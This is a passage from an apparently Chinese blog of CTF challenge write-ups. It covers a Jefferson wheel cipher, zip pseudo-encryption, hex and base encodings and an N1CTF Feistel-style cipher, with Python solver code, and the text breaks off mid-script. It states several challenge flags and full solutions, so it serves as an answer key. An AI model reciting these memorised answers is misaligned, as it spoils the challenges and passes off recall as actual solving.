temp+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到flag<code>₧</code>lei_ci_jiami，其中Pts是bug，删掉就好了。</p><h1 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h1><blockquote><p>1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;<br>2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;<br>3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;<br>4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;<br>5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;<br>6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;<br>7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;<br>8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;<br>9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;<br>10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;<br>11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;<br>12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;<br>13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;<br>14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;<br>密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12<br>密文：HCBTSXWCRQGLES<br>flag格式 flag{你解密的内容}</p></blockquote><p>看了大佬的wp，是<strong>转轮加密</strong>。</p><blockquote><p>杰弗逊在1795年发明了一种加密装置叫做杰弗逊圆盘（Jefferson disk ），或叫杰弗逊转轮加密器（Jefferson wheelcipher ）。<br>这个装置有36片同样大小的木制转轮，套在一根铁杆上。每片转轮的圆周边缘上刻有乱序的26个英文字母其使用方法是：进行秘密通信的双方必须各自拥有完全一样转轮加密器。当一方要把一段文字（不超过36字）秘密通知身处异地的对方时，只需转动加密器上的各片转轮，使这段文字正好出现在同一行上，这时转轮上排列的其他25行都是无意义的乱码；再把其中任意一行的乱码抄下来交给信使。信使并不知道这段乱码文字的意义，只负责把它送交对方。对方收到乱码信后，只需拿出自己保存的同样的装置，转动上面各片转轮，让其中一行的排列和这段乱码同处在一行上，然后再查看其他25行上的内容，其中必然有一行显示出加密者要传达的信息，而其他行显示的都是乱码。</p></blockquote><p>首先要根据密钥把14行字符串调整顺序，第一行是原来的第二行，第二行是原来的第五行，以此类推，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">KPBELNACZDTRXMJQOYHGVSFUWI</span><br><span class="line">IHFRLABEUOTSGJVDKCPMNZQWXY</span><br><span class="line">ZWAXJGDLUBVIQHKYPNTCRMOSFE</span><br><span class="line">BDMAIZVRNSJUWFHTEQGYXPLOCK</span><br><span class="line">AMKGHIWPNYCJBFZDRUSLOQXVET</span><br><span class="line">RPLNDVHGFCUKTEBSXQYIZMJWAO</span><br><span class="line">QWATDSRFHENYVUBMCOIKZGJXPL</span><br><span class="line">GWTHSPYBXIZULVKMRAFDCEONJQ</span><br><span class="line">NOZUTWDCVRJLXKISEFAPMYGHBQ</span><br><span class="line">XPHKZGJTDSENYVUBMLAOIRFCQW</span><br><span class="line">WABMCXPLTDSRJQZGOIKFHENYVU</span><br><span class="line">BMCSRFHLTDENQWAOXPYVUIKZGJ</span><br><span class="line">XPLTDAOIKFZGHENYSRUBMCQWVJ</span><br><span class="line">TDSWAYXPLVUBOIKZGJRFHENMCQ</span><br></pre></td></tr></table></figure><p>接着，我们需要对密文调整每行字符串，<br>密文第一个字符H，第一行则变为：HGVSFUWIKPBELNACZDTRXMJQOY<br>密文第二个字符C，第二行则变为：CPMNZQWXYIHFRLABEUOTSGJVDK<br>以此类推………</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HGVSFUWIKPBELNACZDTRXMJQOY</span><br><span class="line">CPMNZQWXYIHFRLABEUOTSGJVDK</span><br><span class="line">BVIQHKYPNTCRMOSFEZWAXJGDLU</span><br><span class="line">TEQGYXPLOCKBDMAIZVRNSJUWFH</span><br><span class="line">SLOQXVETAMKGHIWPNYCJBFZDRU</span><br><span class="line">XQYIZMJWAORPLNDVHGFCUKTEBS</span><br><span class="line">WATDSRFHENYVUBMCOIKZGJXPLQ</span><br><span class="line">CEONJQGWTHSPYBXIZULVKMRAFD</span><br><span class="line">RJLXKISEFAPMYGHBQNOZUTWDCV</span><br><span class="line">QWXPHKZGJTDSENYVUBMLAOIRFC</span><br><span class="line">GOIKFHENYVUWABMCXPLTDSRJQZ</span><br><span class="line">LTDENQWAOXPYVUIKZGJBMCSRFH</span><br><span class="line">ENYSRUBMCQWVJXPLTDAOIKFZGH</span><br><span class="line">SWAYXPLVUBOIKZGJRFHENMCQTD</span><br></pre></td></tr></table></figure><p>观察一下，倒数第六列就是flag了。改成小写提交flag{xsxsbugkuadmin}</p><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>下载zip，用winHex打开，找到第二个PK，将09改成00（奇数表示加密，偶数表示未加密）<br><img src="https://img-blog.csdnimg.cn/20200226185018336.png" alt="在这里插入图片描述"></p><h1 id="告诉你个秘密-ISCCCTF"><a href="#告诉你个秘密-ISCCCTF" class="headerlink" title="告诉你个秘密(ISCCCTF)"></a>告诉你个秘密(ISCCCTF)</h1><blockquote><p>636A56355279427363446C4A49454A7154534230526D6843<br>56445A31614342354E326C4B4946467A5769426961453067</p></blockquote><p>1、查看给的字符串，字符只有A-F，而且上下两两结合对应的十进制数小于128；<br>2、将它们转化成ASCII对应的字母，得到cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g<br>3、2中得到的字符串，像是经过了base64加密，解密得到<code>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</code><br>4、看大佬wp，脑洞太大了吧！！！看键盘r5yG包围着T，以此类推得到TONGYUAN，直接提交就OK了。</p><p>下面是脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">strs=<span class="string">"636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">strs_len = len(strs)</span><br><span class="line">chs=[]</span><br><span class="line"><span class="keyword">while</span>(i &lt; strs_len):</span><br><span class="line">    chs.append(chr(int(strs[i:i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line">    i = i + <span class="number">2</span></span><br><span class="line">print(<span class="string">""</span>.join(chs))</span><br><span class="line">print(base64.b64decode(<span class="string">""</span>.join(chs)))</span><br></pre></td></tr></table></figure><h1 id="这不是md5"><a href="#这不是md5" class="headerlink" title="这不是md5"></a>这不是md5</h1><blockquote><p>666c61677b616537333538376261353662616566357d</p></blockquote><p>16进制转字符串就OK了，转换地址：<a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">https://www.sojson.com/hexadecimal.html</a></p><h1 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h1><blockquote><p>@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!</p></blockquote><p>看了大佬wp，是base91编码，国内没有免费的base91在线解密网站，大佬fq找到了<a href="https://www.dcode.fr/base-91-encoding" target="_blank" rel="noopener">https://www.dcode.fr/base-91-encoding</a>，不得不说tql。</p><h1 id="富强民主"><a href="#富强民主" class="headerlink" title="富强民主"></a>富强民主</h1><blockquote><p>公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治</p></blockquote><p>核心价值观编码<a href="https://aliyunvi.com/cvencode" target="_blank" rel="noopener">https://aliyunvi.com/cvencode</a></p><h1 id="python-N1CTF"><a href="#python-N1CTF" class="headerlink" title="python(N1CTF)"></a>python(N1CTF)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#challenge.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> N1ES <span class="keyword">import</span> N1ES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">n1es = N1ES(key)</span><br><span class="line">flag = <span class="string">"N1CTF&#123;*****************************************&#125;"</span></span><br><span class="line">cipher = n1es.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(cipher)  <span class="comment"># HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#N1ES.py</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    f = <span class="keyword">lambda</span> x, y: x + y - <span class="number">2</span> * (x &amp; y)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        res += chr(f(ord(a[i]), ord(b[i])))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutate</span><span class="params">(table, block)</span>:</span></span><br><span class="line"><span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bits</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    l = len(data) * <span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            result[(pos&lt;&lt;<span class="number">3</span>)+i] = (ch&gt;&gt;i) &amp; <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">54</span>, <span class="number">132</span>, <span class="number">138</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">187</span>, <span class="number">84</span>, <span class="number">146</span>, <span class="number">30</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">72</span>, <span class="number">161</span>, <span class="number">116</span>, <span class="number">63</span>, <span class="number">161</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">24</span>, <span class="number">126</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">30</span>, <span class="number">117</span>, <span class="number">185</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">140</span>, <span class="number">70</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">150</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">36</span>, <span class="number">90</span>, <span class="number">149</span>, <span class="number">54</span>, <span class="number">156</span>, <span class="number">8</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">110</span>, <span class="number">56</span>,<span class="number">1</span>, <span class="number">84</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">41</span>, <span class="number">99</span>, <span class="number">151</span>, <span class="number">119</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">166</span>, <span class="number">125</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">105</span>, <span class="number">133</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">29</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">81</span>, <span class="number">134</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">180</span>, <span class="number">78</span>, <span class="number">175</span>, <span class="number">108</span>, <span class="number">26</span>, <span class="number">121</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">142</span>, <span class="number">177</span>, <span class="number">143</span>, <span class="number">86</span>, <span class="number">129</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">34</span>, <span class="number">177</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">147</span>, <span class="number">90</span>, <span class="number">49</span>, <span class="number">135</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">19</span>, <span class="number">89</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">155</span>, <span class="number">83</span>, <span class="number">38</span>, <span class="number">159</span>, <span class="number">179</span>, <span class="number">19</span>, <span class="number">157</span>, <span class="number">68</span>, <span class="number">105</span>, <span class="number">151</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">122</span>, <span class="number">179</span>, <span class="number">114</span>, <span class="number">52</span>, <span class="number">183</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">161</span>, <span class="number">141</span>, <span class="number">18</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">81</span>, <span class="number">156</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">38</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">59</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">75</span>, <span class="number">164</span>, <span class="number">190</span>, <span class="number">140</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">188</span>, <span class="number">77</span>, <span class="number">165</span>, <span class="number">105</span>, <span class="number">5</span>, <span class="number">107</span>, <span class="number">31</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">162</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">158</span>, <span class="number">153</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">77</span>, <span class="number">156</span>, <span class="number">11</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">169</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">161</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">110</span>, <span class="number">191</span>, <span class="number">43</span>, <span class="number">82</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">102</span>, <span class="number">166</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">5</span>, <span class="number">189</span>, <span class="number">27</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(o)</span>:</span></span><br><span class="line">    k = permutate(s_box,o)</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(k), <span class="number">7</span>):</span><br><span class="line">        b.append(k[i:i+<span class="number">7</span>] + [<span class="number">1</span>])</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b[i]:</span><br><span class="line">x += (j&lt;&lt;pos)</span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">c.append((<span class="number">0x10001</span>**x) % (<span class="number">0x7f</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(key) != <span class="number">24</span> <span class="keyword">or</span> isinstance(key, bytes) == <span class="literal">False</span> ):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"key must be 24 bytes long"</span>)</span><br><span class="line">        self.key = key</span><br><span class="line">        self.gen_subkey()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = string_to_bits(self.key)</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        o = generate(o)</span><br><span class="line">        k.extend(o)</span><br><span class="line">        o = string_to_bits([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> o[<span class="number">0</span>:<span class="number">24</span>]])</span><br><span class="line">        self.Kn = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            self.Kn.append(map(chr, k[i * <span class="number">8</span>: i * <span class="number">8</span> + <span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(plaintext) % <span class="number">16</span> != <span class="number">0</span> <span class="keyword">or</span> isinstance(plaintext, bytes) == <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"plaintext must be a multiple of 16 in length"</span>)</span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">16</span>):</span><br><span class="line">            block = plaintext[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                L, R = R, (round_add(L, self.Kn[round_cnt]))</span><br><span class="line">            L, R = R, L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>猜测题目是让我们根据给的加密方式，写出解密脚本。难度较大，参考大佬wp：<br>注意运行环境是python2，可以在<a href="https://c.runoob.com/compile/6" target="_blank" rel="noopener">菜鸟工具</a>在线运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_add</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    f = <span class="keyword">lambda</span> x,y: x + y - <span class="number">2</span> * (x &amp; y)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        res += chr(f(ord(a[i]),ord(b[i])))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutate</span><span class="params">(table,block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bits</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    l = len(data)*<span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            result[(pos&lt;&lt;<span class="number">3</span>)+i] = (ch&gt;&gt;i) &amp; <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">54</span>, <span class="number">132</span>, <span class="number">138</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">187</span>, <span class="number">84</span>, <span class="number">146</span>, <span class="number">30</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">72</span>, <span class="number">161</span>, <span class="number">116</span>, <span class="number">63</span>, <span class="number">161</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">24</span>, <span class="number">126</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">30</span>, <span class="number">117</span>, <span class="number">185</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">140</span>, <span class="number">70</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">150</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">36</span>, <span class="number">90</span>, <span class="number">149</span>, <span class="number">54</span>, <span class="number">156</span>, <span class="number">8</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">110</span>, <span class="number">56</span>,<span class="number">1</span>, <span class="number">84</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">41</span>, <span class="number">99</span>, <span class="number">151</span>, <span class="number">119</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">166</span>, <span class="number">125</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">105</span>, <span class="number">133</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">29</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">81</span>, <span class="number">134</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">180</span>, <span class="number">78</span>, <span class="number">175</span>, <span class="number">108</span>, <span class="number">26</span>, <span class="number">121</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">142</span>, <span class="number">177</span>, <span class="number">143</span>, <span class="number">86</span>, <span class="number">129</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">34</span>, <span class="number">177</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">147</span>, <span class="number">90</span>, <span class="number">49</span>, <span class="number">135</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">19</span>, <span class="number">89</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">155</span>, <span class="number">83</span>, <span class="number">38</span>, <span class="number">159</span>, <span class="number">179</span>, <span class="number">19</span>, <span class="number">157</span>, <span class="number">68</span>, <span class="number">105</span>, <span class="number">151</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">122</span>, <span class="number">179</span>, <span class="number">114</span>, <span class="number">52</span>, <span class="number">183</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">161</span>, <span class="number">141</span>, <span class="number">18</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">81</span>, <span class="number">156</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">38</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">59</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">75</span>, <span class="number">164</span>, <span class="number">190</span>, <span class="number">140</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">188</span>, <span class="number">77</span>, <span class="number">165</span>, <span class="number">105</span>, <span class="number">5</span>, <span class="number">107</span>, <span class="number">31</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">162</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">158</span>, <span class="number">153</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">77</span>, <span class="number">156</span>, <span class="number">11</span>, <span 